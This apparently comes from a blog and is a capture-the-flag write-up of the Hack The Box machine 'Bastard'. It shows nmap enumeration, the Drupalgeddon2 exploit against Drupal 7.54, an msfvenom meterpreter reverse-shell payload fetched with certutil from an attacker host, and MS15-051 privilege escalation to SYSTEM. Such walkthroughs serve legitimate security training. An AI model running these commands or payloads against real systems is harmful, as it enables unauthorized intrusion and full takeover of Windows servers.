---
clayout: ctf
title: Bastard
date: 2025-09-17
image: /ctf/hack-the-box/machines/bastard/info-card.png
type: Hack The Box

ctf:
    - name: Bastard
      link: https://app.hackthebox.com/machines/7
      thumbnail: /ctf/hack-the-box/machines/bastard/info-card.png
      pwned:
        - link: https://labs.hackthebox.com/achievement/machine/585215/7
          thumbnail: /ctf/hack-the-box/machines/bastard/pwned.png
---

## Machine Overview

This box hosts a vulnerable **Drupal** site running on **Windows Server 2008 R2** with **IIS 7.5**. We'll exploit a Drupal vulnerability to get a shell as `iusr`, then escalate to `SYSTEM` using a known local privilege escalation.

## Enumeration

### Nmap Scan

We start with a nmap scan to identify open ports and services:

```bash
nmap -sC -sV -A -oN nmap.txt 10.10.10.9
```

**Scan Results:**

```bash
PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 7.5
|_http-title: Welcome to Bastard | Bastard
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
|_/LICENSE.txt /MAINTAINERS.txt
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
135/tcp   open  msrpc   Microsoft Windows RPC
49154/tcp open  msrpc   Microsoft Windows RPC
```

**Key findings:**

* Port **80** is running **Microsoft IIS 7.5** and serves a **Drupal** site.
* Ports **135** and **49154** are used for **Microsoft RPC**, which could be useful for later exploitation.

## HTTP Enumeration

Visiting `http://10.10.10.9` reveals a default Drupal page:

![Bastard - Default Web Page](/ctf/hack-the-box/machines/bastard/default-login.png)

To identify the exact Drupal version, we check the `CHANGELOG.txt` file:

```http
http://10.10.10.9/CHANGELOG.txt
```

It reveals:

```text
Drupal 7.54, 2017-02-01
```

## Exploiting Drupal (Drupalgeddon2)

Drupal 7.54 is vulnerable to **Drupalgeddon2**, which allows remote code execution. We use the following exploit from Exploit-DB:

[Drupalgeddon2 - Exploit-DB #44449](https://www.exploit-db.com/exploits/44449)

Run the exploit:

```bash
ruby 44449.rb http://10.10.10.9
```

**Shell Access:**

```bash
drupalgeddon2>> whoami
nt authority\iusr
```

We get a shell as the unprivileged user `iusr`.

## Reverse Shell

To stabilize our access, we use `msfvenom` to generate a meterpreter reverse shell:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f exe > revshell.exe
```

We host it via Python server and use `certutil` to download it to the target:

```bash
certutil -urlcache -f http://10.10.14.2:8000/revshell.exe revshell.exe
.\revshell.exe
```

> [!NOTE] Don’t forget to start a listener:
>
> ```bash
> nc -lnvp 4444
> ```

Once the reverse shell connects, we get a shell as `iusr`:

```bash
C:\inetpub\drupal-7.54>whoami
nt authority\iusr
```

## Privilege Escalation

We check system info:

```bash
systeminfo
```

**Output:**

```bash
OS Name:    Microsoft Windows Server 2008 R2 Datacenter
OS Version: 6.1.7600 N/A Build 7600
```

This version is vulnerable to the **MS15-051** privilege escalation exploit.

We transfer and execute the exploit using `certutil`:

```bash
certutil -urlcache -f http://10.10.14.2:8000/ms15-051x64.exe ms15-051x64.exe
.\ms15-051x64.exe whoami
```

**Success:**

```bash
[#] ms15-051 fixed by zcgonvh
[!] process with pid: 336 created.
==============================
nt authority\system
```

We now have **SYSTEM** access.

> [!IMPORTANT] User & Root Flags
>
> * User: `C:\Users\dimitris\Desktop\user.txt`
> * Root: `C:\Users\Administrator\Desktop\root.txt`
